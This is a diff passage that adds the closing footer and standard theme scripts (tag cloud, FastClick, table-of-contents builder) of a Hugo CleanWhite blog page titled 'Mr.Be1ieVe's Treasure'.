+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
